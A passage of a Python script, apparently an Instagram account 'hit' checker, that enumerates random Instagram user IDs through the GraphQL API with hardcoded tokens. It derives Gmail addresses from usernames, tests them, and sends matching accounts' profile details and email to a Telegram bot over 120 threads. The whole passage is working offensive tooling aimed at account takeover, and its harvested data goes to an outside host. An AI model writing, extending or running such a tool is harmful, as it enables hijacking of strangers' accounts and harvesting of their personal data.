    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
    )
    try:
    	ss = response.text
    	if '"gf.uar",1' in ss:
    		ge+=1
    		sax()
    		e = ninja(y)
    		tg(id, token, x, y, e)
    	else:
    		be+=1
    		sax()
    except:
    	be+=1
    	sax()
import requests

def tg(id, token, info, y, e):
	global ge
	if e:
		z = e
	else:
		z = 'ma cud gyi hit ki'
	headers = {
	'authority': 'www.instagram.com',
	'accept': '*/*',
	'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
	'content-type': 'application/x-www-form-urlencoded',
	'origin': 'https://www.instagram.com',
	'sec-ch-prefers-color-scheme': 'dark',
	'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-model': '""',
	'sec-ch-ua-platform': '"Linux"',
	'sec-ch-ua-platform-version': '""',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-origin',
	'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
	'x-asbd-id': '359341',
	'x-bloks-version-id': '446750d9733aca29094b1f0c8494a768d5742385af7ba20c3e67c9afb91391d8',
	'x-csrftoken': 'WCu4eqffrttETY77lwfLp44ZUIISFWdF',
	'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
	'x-fb-lsd': 'lcECBEfHHpWwpjVs89xeT9',
	'x-ig-app-id': '936619743392459',
	'referer': f'https://www.instagram.com/{info}/',
	}
	params = {
	'username': info,
	}
	try:
		response = requests.get('https://www.instagram.com/api/v1/users/web_profile_info/', headers=headers, params=params)
		data = response.text
		js = response.json()
		user_data = js.get('data', {}).get('user', {})
		u = user_data.get('username', None)
		fn = user_data.get('full_name', None)
		b = user_data.get('biography', None)
		f1 = user_data.get('edge_followed_by', {}).get('count', 0)
		f2 = user_data.get('edge_follow', {}).get('count', 0)
		p = user_data.get('is_private', None)
		p1 = user_data.get('edge_owner_to_timeline_media', {}).get('count', 0)
		biz = user_data.get('is_business_account', None)
		if f1 > 10 and p1 > 2:
			m = 'True'
		else:
			m = 'False'
		x = u if u else info
		msg = f"""
╔═══════════════════════════════════════════════╗
║               𝗧𝗢𝗢𝗟 𝗕𝗬 𝗭𝗢𝗥𝗥𝗢                 ║
╠═══════════════════════════════════════════════╣
║  🜲 𝗕𝗜𝗭𝗭        : {biz}                         ║
║  🜲 𝗠𝗘𝗧𝗔        : {m}                          ║
║  🜲 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦  : {f1}                         ║
║  🜲 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚𝗦 : {f2}                         ║
║  🜲 𝗣𝗢𝗦𝗧𝗦      : {p1}                         ║
║  🜲 𝗕𝗜𝗢        : {b}                          ║
║  🜲 𝗣𝗥𝗜𝗩𝗔𝗧𝗘    : {p}                          ║
║  🜲 𝗙𝗨𝗟𝗟 𝗡𝗔𝗠𝗘 : {fn}                         ║
║  🜲 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘  : @{x}                          ║
║  🜲 𝗘𝗠𝗔𝗜𝗟     : {y}                          ║
║  🜲 𝗥𝗘𝗦𝗘𝗧      : {z}                          ║
║  🜲 𝗨𝗥𝗟       : https://www.instagram.com/{x}  ║
╠═══════════════════════════════════════════════╣
║          𝗛𝗜𝗧 𝗕𝗬 : @talwnder ,𝗝𝗔𝗖𝗞                        ║
╚═══════════════════════════════════════════════╝
"""
	except:
		msg = f"""
╔═══════════════════════════════════════════════╗
║               𝗧𝗢𝗢𝗟  𝗕𝗬 𝗭𝗢𝗥𝗥𝗢                ║
╠═══════════════════════════════════════════════╣
║  🜲 𝗕𝗜𝗭𝗭        : {biz}                         ║
║  🜲 𝗠𝗘𝗧𝗔        : {m}                          ║
║  🜲 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦  : {f1}                         ║
║  🜲 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚𝗦 : {f2}                         ║
║  🜲 𝗣𝗢𝗦𝗧𝗦      : {p1}                         ║
║  🜲 𝗕𝗜𝗢        : {b}                          ║
║  🜲 𝗣𝗥𝗜𝗩𝗔𝗧𝗘    : {p}                          ║
║  🜲 𝗙𝗨𝗟𝗟 𝗡𝗔𝗠𝗘 : {fn}                         ║
║  🜲 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘  : @{x}                          ║
║  🜲 𝗘𝗠𝗔𝗜𝗟     : {y}                          ║
║  🜲 𝗥𝗘𝗦𝗘𝗧      : {z}                          ║
║  🜲 𝗨𝗥𝗟       : https://www.instagram.com/{x}  ║
╠═══════════════════════════════════════════════╣
║          𝗛𝗜𝗧 𝗕𝗬 : @talwnder , 𝗝𝗔𝗖𝗞                     ║
╚═══════════════════════════════════════════════╝
"""
	params = {
	"chat_id": id,
	"text": msg
	}
	requests.get(f'https://api.telegram.org/bot{token}/sendMessage', params=params)
def csrf(legend):
    while True:
        try:
            headers = {
                'user-agent': "Mozilla/5.0 (Linux; Android 14; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
                'x-ig-app-id': '936619743392459'
            }
            r = legend.get('https://www.instagram.com/', headers=headers, timeout=3)
            token = r.cookies.get_dict().get('csrftoken', '')
            if token:
                with open("csrf.txt", "w") as f:
                    f.write(token)
                break
        except:
            pass
def csrfX():
    try:
        with open("csrf.txt", "r") as f:
            return f.read().strip()
    except:
        return ""
def users():
    primeXcxqok1 = requests.Session()
    while True:
        try:
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            cookies = {
                'rur': '"VLL\\05476944984014\\0541788877382:01feb9c5b489b4665ce93731c710cac36c78fdb4c176515a1e9a902103d9b08a5e1aef0f"'
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 14; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
                'Content-Type': 'application/x-www-form-urlencoded',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-model': '"SM-A235F"',
                'x-ig-app-id': '1217981644879628',
                'sec-ch-ua-mobile': '?1',
                'x-fb-friendly-name': 'QuickPromotionSupportIGSchemaBatchFetchQuery',
                'x-fb-lsd': lsd,
                'sec-ch-ua-platform-version': '"14.0.0"',
                'x-asbd-id': '359341',
                'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
                'sec-ch-prefers-color-scheme': 'light',
                'x-csrftoken': csrfX(),
                'sec-ch-ua-platform': '"Android"',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/vihaantheking333/',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            }
            fvck = random.randint(2500000000, 21254029834)
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': json.dumps({"userID": fvck, "username": "cristiano"}),
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            r = primeXcxqok1.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data, timeout=10)
            if r.status_code == 200:
                j = r.json()
                loda = j.get('data', {}).get('user', {})
                if not loda:
                    continue
                u = loda.get('username')
                f = loda.get('follower_count', 0)
                if u and f > 17:
                    cxqok(u+'@gmail.com')
        except:
            pass
primeXcxqok = requests.Session()
csrf(primeXcxqok)
for i in range(120):
    Thread(target=users).start()
    
   